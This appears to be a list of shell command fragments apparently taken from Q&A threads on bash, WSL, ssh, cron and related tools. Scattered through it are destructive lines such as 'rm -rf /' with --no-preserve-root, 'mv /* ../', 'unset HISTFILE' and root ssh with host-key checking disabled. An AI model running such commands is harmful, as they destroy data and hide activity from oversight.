fstdraw in.fst | cat_maybe dummy.txt | dot ...
cd ~
cd ../..
%LOCALAPPDATA%\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc \LocalState\rootfs
<installation folder>\rootfs\home\username
sudo -H Nautilus
wsl -l -q
net use Z: \\wsl$\Debian /PERSISTENT:YES
hidden items
man awk
dnf updateinfo info
dnf check-update
dnf updateinfo
echo <<< more than one word
<<< a
cat -n < foo.txt
cat < foo.txt -n
< foo.txt cat -n
Mono C#
su admin
\ \*
man date
man strftime
Sat March 09
Wed Jan 02
Wed Jan 02 12:34:56 UTC 2013
docker images
docker inspect --format '{{.RootFS.Layers}}' _imageId_
find -type f -printf '%T+ %p\n' | sort | xargs -0  -d '\n' rm -i
find . -type f -print0 | xargs -0 ls -rt
find -type f -printf '%T+ %p\n' | sort | cut -c32- | xargs -p -n1 -d '\n' rm
-p, --interactive
-n max-args, --max-args=max-args
-d delim
xargs -p
ps aux
su rpmbuild
kill -20 PID
kill -18 PID
ps -ef
kill -9
sudo rsync -av --delete /directory1 /directory2
No MTA installed
crontab -e
MinGW bash
bash.exe": cd: c/Users/<username>: No such file or directory
$ launch.bash /path/to/data
xterm -hold -geometry 200x20+2+700 -e "python /home/me/doSomething.py --directory $1; echo python /home/me/doSomething.py --directory $1; bash"
alias vim="/usr/local/Cellar/macvim/8.0-119_1/MacVim.app/Contents/MacOS/Vim"
which vim
brew install macvim --with-override-system-vim
which bubu
:set runtimepath
:set helpfile
cp --parents
incrontab -e
icrontab -l
/var/vhosts/localdir IN_ALL_EVENTS /bin/rclonescript.sh
tail -f /var/log/cron
* * * * * /bin/rclonescript.sh
type python
echo $PATH
PATH=echo $PATH | sed -e 's/:\/cygdrive/c/Users/pnwar/AppData/Local/Programs/Python/Python36\/$//'
PATH=\$PATH:/cygdrive/c/Users/pnwar/AppData/Roaming/Microsoft/Windows/'Start Menu'/Programs/'Python 3.6'
chmod +x filename
chmod +x
Windows Subsystem for Linux
rm -rf /
rm ​-rf --no-​preserve-root "/​mnt/c"
rm ​-rf --no-​preserve-root "/​"
lxrun.exe /uninstall /full /y && lxrun.exe /install /y
ps aux | grep sleep
cmd /c
set-prompt <name>
ls -l
chsh -s /bin/bash
for x in */* ; do [ -d $x ] && ( echo cd $x ; echo pwd ; echo mv * .. ; echo cd ../.. ) ; done
-mindepth $D
-maxdepth $D
"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
C:\Program Files (x86)\Google\Chrome\Application\chrome.exe: command not found
cp --parents
"cp ..... && rm {} \;"
man lftp
man lftp
bash script.sh
su <user> -c "commands here"
sudo xfconf-query -c xsettings -p /Net/ThemeName -s "Greybird"
su <user> -c "command here"
perl t/fi
perl -d t/fi
top -o %MEM -b
! /\([0-9]+\)/
match($0, /Txt_BI_ProfilesBI_Profile_Export_([^.]+)/,matches)
cat " $0 "*
>"matches[1] ".txt"
find .
-type f
-regextype sed
! -regex "\./.*([0-9]\+)"
| xargs
bash -c
'cat {}* > {}.txt'
Linux Filesystem
<name>: <value>, <name>: <value>, ...
(reading commands) | mbuffer -p 1 -m 5G | tee <(ffmpeg -i - (splitting video stream here) -f avi | ssh 1.2.3.4 'ffmpeg -i - (doing some encoding here) -f <format> - ') | <( ffmpeg -i (processing audio adequately) )
ffmpeg -i <s -tream1> -i <stream2> (doing final conversion)
(doing some encoding here)
(do something)
tar --exclude=./backups/ -cvvzf $ftp-$datum.tar.gz *
Xubuntu 16.04
ssh myhost true
bash test.sh
bash < test.sh
echo 2
xrandr --current --verbose
modprobe snd_bcm2835
modprobe snd-aloop
aplay -l
arecord -l
man echo
type echo
help echo
man echo
printf "s\n"
alias explorer='/mnt/c/Windows/explorer.exe'
explorer ./src/main
explorer logfile.txt
sudo bash ./myscript.sh --key=~/.ssh/mykey-rsa
exec ssh-agent bash
ssh-agent bash
Warning: bash already installed, it's just not linked
ps aux
ps auxf
kill 29144
ps -p <YOURPID>
echo $?
ps -p 5339
sh.exe --login
echo "cd c/Windows/system32/" > ~/.bashrc
sh.exe --login
\Program Files\
echo "export var=/your/path" >>~/.bashrc && source ~/.bashrc
cd $var
> /a.txt
So 2017-04-16 19:19:12 UTC
>* -cur_console:d:c:\to\startup\directory python myapplication.py
sudo history
echo $?
man bash
help non-bash-command
grep '^sudo' .bash_history
sudo journalctl _COMM=sudo
sudo bash
sudo bash -c history
echo history | sudo bash -i
col -bp <filename.log > fileout.log
sed "s/.*is a shell function from //g"
fsck -n
make install
vim .bashrc
echo $PATH
gcc -v
yum install centos-release-scl-rh
scl enable devtoolset-3 bash
yum install centos-release-scl-rh
scl enable devtoolset-3 bash
scl enable devtoolset-2 bash
A a a
A\ a\ a
sed < file.txt
cat file.txt | sed
alias and=&&
:help shell
:set shell=/path/to/shell
find /etc -name '*bashrc*'
/System/Library/User Template/
export HISTCONTROL=erasedups:ignorespace
export HISTCONTROL=ignoredups:ignorespace
export HISTCONTROL=erasedups: ignoreboth
") (above tilde key). (same bug occurs if you have
rm /tmp/test.log
truncate -s0 /tmp/test.log
echo ..
(cd $HOME; cat .bashrc)
which cp
echo $PATH
ALT + >
ALT + >
sed -r 's/(\d{1,2})-([0-9]{2})-([0-9]{4})/\3-\2-\1/g'
bash replace-script.sh
cd ,,
cd ..
cd ..
if then else
&& ||
-L -P
cd -L ,,
alias -g ,,=".."
man zshbuiltins
man bash
man 1p alias
cd \grep
grep --color=auto
alias ,,=..
grep -v
grep -v "$UsersName.img" /etc/fstab > /etc/fstab.bak; mv /etc/fstab.bak /etc/fstab
sed '/line3/ r data.txt' file1.txt   (this will add contents of data.txt to file1.txt after "line3" string.
:set paste
sudo /usr/share/vboot/bin/make_dev_ssd.sh --remove_rootfs_verification
ls -l
ls -l
sudo sed -i 's#PATH=\"[^\"]*#&:/opt/thing#' /etc/environment
systemctl edit --full cron.service
SOURCE="$(realpath special_bash)" envsubst <./special_bash_runner_source >/usr/bin/special_bash
[ -t 0 ] && [ -t 1 ] && set +e
set -e
$ special_bash
dd if=test.txt| dd obs=1M | dd obs=1M | dd of=test2.txt
buffer 512M 3
stty erase ^H
stty erase ^?
set -o monitor
stty erase
alias 'tcsh' '~/launch-tcsh.sh'
mono --version
bash script
mono --version
ln -s Foo foo
mkdir foo
touch foo
sudo kill <PID>
startsecs =0
set-option -g default-shell "/bin/bash"
set-option -g default-shell $SHELL
file_0, ..., file_{N-1}
[ [f0..f0-1], [fn..f2n-1]..]
alias binobj="du -sc bin/ obj/ | grep total ; find . -iname "bin" -o -iname "obj" | xargs rm -rf"
find . -iname "bin" -o -iname "obj" | xargs -I % sh -c "du -sb % >> /tmp/delreport.log; rm -rf %"; awk '{sum+=$1} END {print sum}' /tmp/delreport.log && rm /tmp/delreport.log
| xargs -I % sh -c "..."
du -sb
awk '{sum+=$1} END {print sum}'
-type d
cat -n
Get-Alias cat
transmission-edit -a udp://tracker my.torrent
transmission-remote -n 'user:pass' --torrent 10 --tracker-add 'udp://tracker.url:1337/announce'
ssh -t a@C 'sudo -u serviceuser bash'
list="a.pdf b.pdf c.pdf"
16 * * * * /bin/bash /path/to/script.sh
Support for mouse double and triple clicks
o2, o4, o5
PlistBuddy -help
"Show Spotlight search"
"Show Finder search window"
Creating UNIX user failed, returned error code 10
groups: cannot find name for group ID 0
cat fifo | another
tail -f
another <fifo
C-x 5 2
M-x ediff-buffers
man echo
man <page name>
while true { echo ' '; sleep 120 }
while sleep 120; do printf '\33[0n'; done
file: myscript.sh
find . -type f | fzf > selected
wcd foo
cd /v/l/fsck
cd /u/s/appl
csvcut -c 70,71,72,73,74,75,76,77,78,79,80 my_input.csv > my_output.csv
netsh interface ip set address "interface name" "dhcp/static" "IPv4 address" "IPv4 mask" "gateway IPv4 address"
netsh interface ip set address "Ethernet" static 10.0.0.5 255.0.0.0 10.0.0.1
netsh int ipv4 add dnsserver "interface name" "DNS IPv4 address" "index=integer" "yes/no"
file 3
stat --printf "…\0"
sort -z
tail -z
cut -z
xargs -0 …
find -print0
sh -c '…'
find -exec
find -type d -exec sh -c 'find "{}" …
find -type d -exec sh -c 'find "$0" … ' {} \;
zsh: invalid argument: 2017.05.27-14:29:13.tiff
bash ./myscript
bash myscript
bash -c "./myscript"
bash -c
bash -c "echo 'aa';echo 'bb'"
. ./myscript
bash ./myscript
bash -c ./myscript
bash terminal > running bash -c > running shebang line with bash
bash subshell
inotifywait -m
update-rc.d exim4 stop
command1; command2
chvt 2
chvt 1; exit
bash -c "./sleep20s"
bash -c "./sleep20s;./sleep20s"
awk options $1
awk options $1 $2
"$1" "$2" …
/home/user/scripts/list_all_drags.sh %f
file = $1
-exec ... \;
#! /bin/cat
find . -type l -exec readlink {} \;
find . -type d -exec basename {} \;
sort | uniq -u | tail -n +2
xargs rmdir
rm -r
ps -ax | grep "anything"
source ...
su -c /path/to/restart.sh homeassistant
I="embedded board link.rtf"
cat $I
cat $1
cat embedded board link.rtf
cat "$1"
cat "embedded board link.rtf"
cat '$1'
cat '$1'
-exec chown -v steven:users {} \;
-exec echo {} \;
C:\Program Files\Java\jre1.8.0_31\bin
ssh -qt oracle@slc05pzz.us.oracle.com 'export ORACLE_HOME=/u01/IDMTOP/products/dir/oid;export PATH=$ORACLE_HOME/bin:$PATH;echo $ORACLE_HOME;$ORACLE_HOME/ldapbind -h slc05pzz.us.oracle.com -p 3060 -D \"cn=orcladmin\"  -w 'password';
bash: /u01/IDMTOP/products/dir/oid/ldapbind: No such file or directory
ssh -qt oracle@slc05pzz.us.oracle.com 'export ORACLE_HOME=/u01/IDMTOP/products/dir/oid;export PATH=$ORACLE_HOME/bin:$PATH;echo $ORACLE_HOME;echo $HOSTNAME;${ORACLE_HOME}/bin/ldapbind -h slc05pzz.us.oracle.com -p 3060 -D "cn=orcladmin"  -w password ; echo $HOSTNAME;
echo $MYSTERIOUS_ENV_VAR
echo $PATH
echo $PATH
find . -type f -size +10G -mtime -10
find . -type f -size +10G -mtime -10 | xargs stat  | cut -d '"' -f2
setsid yes &
mv misc/* *
mv misc/* .
mv ./\* ./misc
find / -name '\*' 2>/dev/null
echo *
mv misc/* *
$(basename {})
sh -c 'echo $(basename {})'
sudo echo … >> …
sudo tee
source ~/.bashrc
source ~./bash_profile
man bash
while read
-name "*c*"
-type d
shopt -s globstar
perl -i -lane
perl -lane
fps= 20
> /var/log/ffmpeg.log
ls */*.*
ls -r */*.*
ls `ls -r`
ls "`ls -r`"
ls -r
-t '/'
ls */*
dir10, dir11, dir101,...
ls -d */*
find */ -maxdepth 1 -type f
-t {delim}
-t '-' -k... -t '/'...
"%ProgramFiles%\Git\bin\bash.exe" script_name.sh
"%ProgramFiles%\Git\bin\bash.exe" -c "echo 'it works'"
"%ProgramFiles%\Git\bin\bash.exe" script_name.sh
"%ProgramFiles%\Git\bin\bash.exe" -c "echo 'it works'"
but the other "script" is just running it from the Windows command prompt. In the CI engine that is what is happening
simple command
go get github.com/aktau/github-release
echo $GOPATH
command -v
PS1='[\u@\h \w]\$ '
[\u@\h \w]\$
git grep
git grpe
gi tgrep
gi tgrpe
shopt cdshell
1.0 TB
5.0 TB
8.0 TB
No such file or directory
nohup ./davmail.sh davmail.properties &
nohup /full/path/to/current/directory/davmail.sh davmail.properties &
tput af <number>
export PS1="\[$(printf "\x1b[48;2;15;100;50m\]A nice dark green [rgb(15,100,50)]:\[\x1b[0m")\] "
export PS1="\[$(printf "\x1b[38;2;255;100;250m\]A lovely shade of pink [rgb(255,100,250)]:\[\x1b[0m")\] "
alias sudo="sudo "
kill %%
kill $!
process1 & process2; kill $!
kill $!
docker save $IMG | (eval $(minikube docker-env) && docker load)
[time [-p]] [!] command1 [| command2 ...]
\[ \]
find . -maxdepth 1 -size +30M -type f -print0 | xargs -0 md5sum
-maxdepth 1
-size +30M
man find
-type f
find . -maxdepth 1 -size +30M -type f -execdir md5sum {} \;
find . -maxdepth 1 -size +30M -type f -execdir md5sum {} + \;
md5sum file1; md5sum file2
md5sum file1 file2
man find
ln -f ...
ln -sf ...
export PATH="$HOME/Software/android-studio/bin/:$PATH"
ls ~/.*
/bin/sh -c "X=1;echo $X;"
sh -c
/bin/sh -c "X=1; echo \$X;"
arr=($(1 2 three 4))
screen -ls
egrep -o '\t.+\t'
sort -n
shopt -s nocaseglob
shopt -u nocaseglob
info bash
shopt -s globasciiranges
shopt -u globasciiranges
export LC_COLLATE
mktemp -u
mktemp -u
myProgram input -
cat > ~/SUfavicon.ico
gzip -cd > ~/SUfavicon.ico
base64 -d
free(): corrupted unsorted chunks
mv downloaded/downloaded/* downloaded && rmdir downloaded/downloaded
xyz downloaded/downloaded
xyz downloaded/downloaded
downloaded downloaded
tar -c
-C downloaded
tar -x
n 
ls -1 /usr/share/terminfo/s/screen*
set-option -g default-shell /bin/zsh
Connection -> Data -> Terminal-type string
man terminfo
man terminfo
wc -c
tail -n 10
pip2install arg1 arg2
. ./checkout.sh
set -a
set -e
set -a
git show <hash>
crontab -e
mkdir "$(echo -ne "foo\nbar")"
rmdir "$(echo -ne "foo\nbar")"
-maxdepth 1
-mindepth 1
-type d
find -exec
find -exec
-n 1
-d " "
-f 2-
cd "some directory name"
cd ""
source ~/.bash_rc
sudo vim /etc/passwd
SHELL=/bin/zsh exec /bin/zsh --login
ssh myhost "ps -ef"
ssh <host> <command>
ssh <host>
ssh <host> <command>
ssh <host>
ssh <host> <command>
ssh <host> <command>
man ssh
ssh host
ssh host command
ssh -t host screen -R
ssh host screen -R
mv /* ../
sudo -u user rm something
-t mysession:0
-t mysession:0.0
C-b :
man vidir
EDITOR=kate vidir
trap […] SIGNAL
set -o xtrace
brew install duti
chmod +x
bash -c "ls -l"
--input=original.txt --output=processed.txt
-in original.txt
cat foo | bar
g++ -std=c++11 -Wall -pedantic -Wno-long-long -Wshadow -g -o "${1%%.c}.out" -lm "$1"
ccc main.c
if [[ $1 =~ $regex ]]; then
if [[ $1 =~ ^[a-zA-Z0-9]*\.cpp$ ]]; then
if [[ $1 =~ ^[a-zA-Z0-9]*\.c$ ]]; then
ccc "*.cpp"
ccc "*.c"
if [[ "$1" == *.cpp ]]; then
man bash
-c string
bash -c 'echo $0' -l
rm ./-foobar
rm -- -foobar
./2017 Digital/redacted Projects-redacted-IP.idx
while read
while IFS= read -r
gpg-connect-agent updatestartuptty /bye
trap DEBUG
help command
info sed
grep -E
curl --data "uname=UID&pwd=PWD" p.q.r.s:xxxx/abc/efg/Login.jsp
curl --data "document.login.Username.value=UID&document.login.Password.value=PWD" p.q.r.s:xxxx/abc/efg/Login.jsp
curl --data "theName=UID&theEmail=PWD" p.q.r.s:xxxx/abc/efg/Login.jsp
curl --user UID:PWD p.q.r.s:xxxx/abc/efg/Login.jsp -v
curl --user UID:PWD p.q.r.s:xxxx/abc/efg/Login.jsp
[with backets]
echo 'hello'
ps aux | awk '{print $7}' | grep -v "?"
bash -c <command>
bash <somescript>
bash -c
find -exec
tee -a
find -print0
xargs -0
xargs -r
$0" "$@"
psshutdown /d
sshpass -p "MYPASSWORD" ssh administrator@MYCOMPUTERNAME
psshutdown /d
sshpass -p "MYPASSWORD" ssh administrator@MYCOMPUTERNAME "whoami"
sshpass -p "MYPASSWORD" ssh administrator@MYCOMPUTERNAME "date"
exec request failed on channel 0
"cmd.exe /c cd /d \"%V\" && bash.exe"
"C:\ProgramData\Microsoft\Windows\Start Menu\cmd.exe.lnk"
commandA && commandB
@="cmd.exe /c start /max cmd.exe /c cd /d \"%V\" && bash.exe"
start /max cmd.exe /c cd /d \"%V\"
cmd /c
cmd /c
Escape c
Escape [ K
man tput
man terminfo
chroot /mnt/sysimage
chroot: failed to run command ‘/bin/bash’: No such file or directory
mount --bind
-B 1
head -1
grep -F
[[ $? ]]
shopt -s dotglob
shopt -s globstar
ssh-keygen -t rsa
ssh-copy-id yourremoteuser@1.2.3.4
find -newerXY
-print -delete
rm *
grep -E '^.{10} (22:4[5-9]|22:5|23:|0[0-4]:)'
file /vmlinuz | grep version
file -bL /vmlinuz
version [^ ]*
version 4.11.0-9.1-liquorix-amd64
GNU bash, version 4.4.12(3)-release (x86_64-unknown-cygwin)
( )
echo "$line" | cut -d " " -f2
remain-on-exit on
set remain-on-exit
set-window-option -g remain-on-exit
man 1 tmux
set set-remain-on-exit
sleep 2
tmux set-window-option …
tmux new-window …
remain-on-exit on
wait-for [-L | -S | -U] channel
wait-for -S
tmux wait -S foo
tmux wait foo
tmux wait foo
tmux wait foo
tmux wait foo
tmux wait -S foo
tmux wait
wait -S
wait -S
wait -S
wait foo
wait foo
echo $(ls)
grep -Ri vfork
node: command not found
mmin +1
tail -f
scp -3 <user1@host1:/file_path1> <user2@host2:/file_path2>
-R 127.0.0.1:9999:host2:22
-e "ssh -p 9999"
ssh -R 127.0.0.1:9999:host2:22 user_host1@host1 -N
ssh user_host1@host1
xargs -0 tar
var templateUrl = require('x.jade')
templateUrl: templateUrl
var templateUrl
templateUrl: require...
/templateUrl:( \K.*))/
templateUrl: .*
print"var templateUrl =$1\n"
var templateUrl =
stty sane
read -r <varname>
read -r <varname>
read -p <varname>
ovf template
sudo -s
./ConfigSender.sh /host_list.txt
sshpass -p $SSHPASS ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=3 root@$ip 'nohup reboot > /dev/null & exit'
... | while
readarray a < file
for ip in "${a[@]}"; do
while read -u 5 -r ip; do
done 5<file
[ "$PS1" = "\\s-\\v\\\$ " ]
"\\s-\\v\\\$ "
cmp -b package1.json package2.json
readlink -f $PWD/*
-type f
-maxdepth 1
$' \t\n'
unset IFS
printenv a
echo $a
variable=foo some_command
variable=foo export variable
printenv a
echo $a
invalid command syntax
cmd-->useradd bidwbre -m -c "Brent Bidwel" -G students
-rwxr-x---. 1 root root 1339 Aug  2 14:58 rh_make_accts.sh*
rm -r node_modules
cmdA || cmdB
rm -r node_modules || :; ...
rm -r node_modules
cmp package.0.json node_modules/package.1.json
rm -r node_modules
npm install
cp package.json node_modules/
./executeADM.sh 'somePath'
./$entry "$path"
sudo -u $(whoami) test2.sh "$1"
./executeADM.sh "/path/with white/space"
./"$entry" "$1"
cd "$path"
You are not allowed to call this shell script from another folder other than its directory
cd "$(dirname "$0")"
man realpath
ll /c/wamp64/bin/php/php7.0.10/php
echo $PATH | tr ":" "\n"
git bash
export PS1='[\u@\h \W](\#)\$ '
echo "Hello .profile"
ERROR: Invalid query
| head -1
echo $PATH
open -e .bash_profile
Trace/BPT trap: 5
echo $(pwd)
echo "$(pwd)"
echo $(pwd)
eval "$(something --alias)"
eval $(something --alias)
echo $(pwd)
echo "$(pwd)"
"$( ... )"
which touch
for i in $arrayVM
read -r value _
echo -e "\e[1mFOO" 
echo print read etc
cat File1 | grep test
grep '\<test\>'
man grep
heroku logs -n5000 -t -a firmplay
source ~/.oh-my-zsh/custom/aliases.zsh
>command arg1 arg2_prefix
sed -i 's/state0/state1/g'
sed '<line number>s/<search pattern>/<replacement string>/
ffmpeg -i rtsp://<user>:<password>@xxx.xxx.xxx.xxx:xxx/play1.sdp -c copy -map 0 -f segment -strftime 1 -segment_time 1800 -segment_format mp4 out-%d_%m_%Y-%H_%M_%S.mp4
which rec
Remember that all constraints must be readded!
Remember …
nano a b
"a b"
sudo -rm -rf /* --no-preserve-root
| cut -f1
apt-get update
apt-get update > missing.lst 2>&1
-bash: sudo: command not found
echo $PATH
sudo vi .bash_profile
-n 2
which ls
which builtin
man builtin
builtin --help
builtin: usage: builtin [shell-builtin [arg ...]]
builtin cd ~
cp -R foo/*
cp -R foo/
cp -R foo/
cp -R foo/*
ls *
cp -R foo/*
cp -R foo/
shopt -s dotglob
cp -R foo/
cp -R foo/
exec 7<file
exec 7<file
git commit
git commit
git cz
git commit
git commit
help command
Features -> Colors
exec /bin/bash --login
exec /bin/bash --login
bash <some options> script.sh
set -euo pipeline
bash -c "set -euo pipefail ; script.sh"
systemd-nspwan -D .. /your-script
exec bash -i
shopt -s globstar
dirname /foo/bar/baz
read -r
read -r
read -r f
while f="$(line)"
read -r f
set -o ignoreeof
export IGNOREEOF=10
(man -t ls | ps2pdf - ~/man_ls.pdf) > evince
( … ) &
"bar1 bar2"
/path/to/foo/bar1 bar2/file.txt
/path/to/foo/bar1\ bar2/file.txt
find | while read
vim "$file" < /dev/tty
find / -type f -not -path "*foo*/*" -not -path "*bar*/*" -print
… <file1
while read …
printf …
$( … )
grep …
" $number"
head …
cut …
sh q.sh
chmod +x q.sh
sh q.sh
\u@\h \w\$
$ my-script.sh -c 5
execute me
-name "*:*"
-type f
-name "*:*"
{} +
type -a cp
sudo ln ...
curl ... | less
> < 2>
curl -s localhost:8083/ | jq
APISTRING+="--data-urlencode \"picture=${picture}\" "
#!/usr/bin/env bash
“Waiting to connect to bluetoothd…”
sudo /usr/local/bin/a2dp-fix-wrapper
echo -e "connect $device_mac\nquit" | bluetoothctl
ssh xyz echo hello
ssh -vvv xyz echo hello
ssh -vvv -t xyz echo hello
scp -o RequestTTY=no -vvv -r mydata/ xyz:/data/
-o RequestTTY=force
exec /bin/bash -l
<input type="submit">
gpr <base_branch>
hub pull-request -b <base_branch> -m <pull-request message or last commit message>
gpr <base_branch>
read -p
if (( ${number} < 10 )) ; then
uptime -s > file1
cp file1 file2
uptime -s > file1
strace uptime -s
curl --cert certificate_file.pem https://example.com/example.xml
curl -T example.xml --cert certificate_file.pem ftps://ftp.server.com/remotedir/
crontab -e
0 8 1-31 1-12 4 /path/your_script.sh
0 8 * * 4 /path/your_script.sh
your_script.sh /path/example_download.xml /path/example_upload.xml
" \n "
echo -e
$' '
LocalForward 127.0.0.1:3680 localhost:3680
'%03d' defines the format of
-discard nokey
-skip_frame nokey
du -sk <(cat somefile)
C:\Program Files (x86)\GnuWin32\bin\ls.exe
C:\Program Files\Git\usr\bin\ls.exe
C:\Program Files\Git\usr\bin
Edit the system environment variables
System variables
C:\Program Files\Git\usr\bin
C:\Program Files\Git\usr\bin
xterm -l
function grepc() { $(which grep) -c "$@"; }
| xargs <function>
export -f grepc
… | xargs bash -c 'grepc "$@"' bash
alias xg='xargs grep --color <or whatever else I want>'
if ["$picture" == "picture_$count.png"]
if [ $picture == pagina_$count.png ]
git --version
C:\Program Files\Git\cmd
bash: git: command not found
\\\\ Hello
echo -e
man 1 bash
echo -e "\ Hello!"
echo -e "\\ Hello!"
\ Hello!
echo -e "\\\ Hello!"
\\ Hello!
echo -e "\\\\ Hello!"
\\ Hello!
echo -e "\\\\\ Hello!"
\\\ Hello!
echo -e "\n Hello!"
echo -e "\\n Hello!"
\n Hello!
echo -e "\\\n Hello!"
\\n Hello!
bash /media/Backups/backup.sh "$1" "$2" filter-list.txt
-bash: cannot create temp file for here-document: No space left on device
cat /path/on/local/client/something.txt >> /path/on/server
cat something.txt | ssh username@server "cat > /path/on/server"
su -m
A && B || C
A && B || C
A && B || C
A && B
A || B
open files
alias gcc=gcc
zsh -x
Long Jackson
gnome-screensaver-command -l
service cron status
bash -x myscript.sh
rsync && rsync
a && b
a || b
a; b
a& b
mv source destination
mv destination source
mkdir /home/user/Trash
source ~/.bashrc
myrm foo
mv /home/user/Trash/* foo
mv -t /home/user/Trash
myrm foo
mv foo /home/user/Trash
alias myrm=trash
trash foo
~/. local/share/Trash
mv "$1" /home/user/Trash/
mv -t /home/user/Trash/
mv /home/user/Trash/
Rest of Script
/usr/bin/sudo su - user1 && $exec_start
exec_start="sudo systemctl start new-service"
sudo su -
less -R
ls --color=auto
ls --color=always
ls --color=auto | less
ls --color=always | less
cat data | grep "{{flag\|[a-z|A-Z\s]+}}"
grep -E
(( $# != 2 )) && exit 1
exit 1
(( $# != 2 ))
exit 1
sudo su
sudo env
man sudo
man sudoers
sudo -s -u oracle
sudo -i -u oracle
chmod a+x findt
findt -h
-type f
stat -c %y
Defaults editor = "/usr/bin/emacs"
Defaults editor = "/usr/bin/emacs visudo"
Defaults editor = "/usr/bin/emacs sudoers"
Defaults env_keep+="EDITOR"
Defaults editor = "emacs"
Defaults editor = /usr/bin/emacs
Defaults editor = "/usr/bin/emacs -u matt"
/usr/bin/emacs -- /etc/sudoers.tmp
echo $file
man printf
unset HISTFILE
du: cannot access '~/Documents/dir': No such file or directory
perl -le 'for(;;){print;sleep(3);}' & tail -s 10 -n 0 -f filename.txt
df .
df /media/RAMDisk
man 5 fstab
mount /media/RAMDisk
ln -s
apt-get install attr
ls -dalF
Permission denied
Operation not permitted
sudo -c "sample-command >> /var/log/output.txt"
sample-command | sudo tee -a /var/log/output.txt >> /dev/null
>| foo
rm -rf fooDir; mkdir -p fooDir
find /var -type d -empty | xargs ls -ltd
rsync -a --delete /var/lib/ntpdate/ fooDir
man readline
. *
. ./*
bash -c "g++"
bash -c "g++ %*"
bash -c "command"
b command
b g++ %*
pkg install termux-exec
bash function
which word
echo … 2> testfile
tail -f /var/log/scp.log
ls -lt $HISTFILE
sqlite3-to-mysql.py A
diff A B > patch
man 1 patch
man 1 diff
balloon 2048M
RETRY LIST
screen -S screen_name
screen -dmS screen_name command
chmod u+x
COLUMNS=1000 sudo iotop -C 10 20 > iotop2.txt
fc -2 0
fc -l
fc -l -2
fc 502 503
GNU bash version 3.2.57
fc -2 -1
sudo rm -rf
    chsh -s /bin/zsh
git shortlog
sed  "2a $(git shortlog)" ./CHANGELOG.md
sed: -e expression #1, char 30: extra characters after command
sed  "2a $(git shortlog)" ./CHANGELOG.md
sed  2r shortlog' ./CHANGELOG.md
sed '2 {h;s/.*/git shortlog/e;H;g}' ./CHANGELOG.md
sed '2a Brendan Deere (4)[...]'
gsed -i '2 {h;s/.*/git shortlog/e;H;g};3,$d' CHANGELOG.md
git shortlog
(echo $BASHPID > /tmp/subpid; ./P | tee /tmp/Pout ) &
tail -f /tmp/Pout | grep -m1 yikes && kill -9 $(cat /tmp/subpid)
timeout [time] cat /dev/ttyACM0 | gpg ... &
timeout cat | cat | gpg
set -e
set -o pipefail
strace timeout 1 cat
man 2 setpgid
strace timeout 1 cat
-s USR1
man 2 kill
gggg || gggg2
apt-get install
alias docker='docker.exe'
docker ps
docker lo
docker logs
sudo curl -L https://raw.githubusercontent.com/docker/cli/master/contrib/completion/bash/docker -o /etc/bash_completion.d/docker
wsl -c [command]
bash -c [command]
wslconfig /list
wslconfig /list /all
wslconfig /setdefault <DistributionName>
wslconfig /setdefault Ubuntu
wsl npm init
wslconfig /unregister <DistributionName>
wslconfig /unregister Ubuntu
wslconfig /list
tput cols
_tmux-margins c
_tmux-margins create
_tmux-margins cwhatever
_tmux-margins d
_tmux-margins e
_tmux-margins +
_tmux-margins +N
_tmux-margins -
_tmux-margins -N
_tmux-margins d
… c
… -
… +
bind-key -T prefix …
_tmux-margins e
set-environment TMUX_M_COMMAND 'cmatrix -b'
_tmux-margins e
_tmux-margins d
sudo du -sh ~student1
sudo du -sh student1 student2...
00 CPU
708 K Memory
export BROWSER='/mnt/c/Program Files/Firefox/firefox.exe'
C:\Program Files\Firefox\firefox.exe
export BROWSER=wslview
alias open="powershell.exe /c start"
export BROWSER=/some/path/to/chrome.exe
/mnt/c/Program Files (x86)/Google/Chrome/Application/chrome.exe
sensible-browser http://localhost:8001/
wslconfig /l
export BROWSER=~/.local/bin/firefox
cp /etc/skel/.bashrc ~/
set theUDID to "123456"
do shell script
bash: ./a.out: Permission denied
sudo: unable to execute ./a.out: Permission denied
sudo mount -o remount,rw -o exec PATH/TO/YOUR/FILE
mount: /home/chronos/user/Downloads not mounted or bad option
When remounting eCryptfs, you need to pass the mount utility the -i parameter to avoid calling the mount helper
sudo mount -o remount,rw -io exec PATH/TO/YOUR/
-bash: cd: /OneDrive: No such file or directory
cd OneDrive\ -\ University of XXX
cd "OneDrive - University of XXX"
cd One
cut -d "/" -f 3
sort | uniq -c | sort -rg
head -n <N> | awk '{print $2}'
Windows Subsystem for Linux
vi $( grep -Irl "foo" | sed -n '2 p')
wc -c $r[2]
pv -b
man bash
export HISTFILE=/var/log/all.log
launchctl load -w /Library/LaunchDaemons/mount.vera.plist
"14">" 3"
date -d
python /Users/me/Desktop/pythonScript/script.py
chmod a+x /Users/me/Desktop/pythonScript/script.py
crontab -l
which python
git commit
echo $(xset led on)
grep -i client3 | cut -f 3
grep -i client2 | cut -f 2
cut -f
diff -y <(xxd FILE) <(xxd FILE_) | colordiff
ls -d
ssh -c
grep -v
sftp> ls -1 */*/Folder*/
sort -u
xargs md5sum
md5sum | cut -d\  -f1
curl -O <link>
configure arguments:
declare -x
help declare
declare -x $SOMETHING
declare -x SOMETHING
declare -x
set -x
read -e
read -e
cp -r
which <command>
grep -w
$( )
wc -l
sort -V
'on off'
_filedir -d
< <(FUNCTION)
env -i ssh ...
set -x
++ echo 'type blah; echo 0'
echo "type blah; echo $?"
type blah; echo <num>
echo "type blah; echo $?"
bash --init-file <(echo "type blah; echo $?")
type blah; echo <num>
type blah; echo $?
<(echo "type blah; echo $?")
(exit 117)
<builtin cmd> | ...
... | <builtin cmd>
<builtin cmd> | <builtin cmd>
cp --backup
while IFS
$ newgrp specialgroup
$ source specialenvironment
chmod +x
iptables -S
find -mindepth ... -maxdepth ... -type d ...
Transfer-Encoding: chunked
-i en0
which x86
grep "Nov 22" /var/log/syslog | grep "cron.daily" -B 5 -A 5
ls -l /etc/cron.daily/
echo "Time: $(date). BINGREWARDS SCRIPT RAN." >> /home/user/bingbot.txt
sudo run-parts /etc/cron.daily
sudo run-parts /etc/cron.daily
Nov 22 17:35:55 ubuntu16 anacron[16777]: Updated timestamp for job cron.daily' to 2017-11-22
25 6   * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
par j1w50 < misc.markdown > misc_new.markdown
var1="1, 2, 3, 4"
var2="3, 4, 5, 6"
var3=1, 2, 5, 6
man sort
, 1
man <command>
man bash
help command
man diff
